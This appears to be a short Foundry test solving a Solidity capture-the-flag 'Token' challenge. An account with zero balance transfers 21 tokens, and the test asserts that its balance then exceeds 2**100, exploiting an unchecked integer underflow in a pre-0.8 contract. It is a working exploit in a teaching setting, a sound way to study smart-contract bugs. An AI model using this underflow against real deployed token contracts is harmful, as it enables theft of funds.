// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/05_token.sol";

contract AttackerTokenTest is Test {
    function testToken() external {
        vm.prank(address(0x1));
        Token token = new Token(1000);

        assertEq(token.balanceOf(address(this)), 0);
        token.transfer(address(0x2), 21);
        assertGt(token.balanceOf(address(this)), 2**100);
    }
}
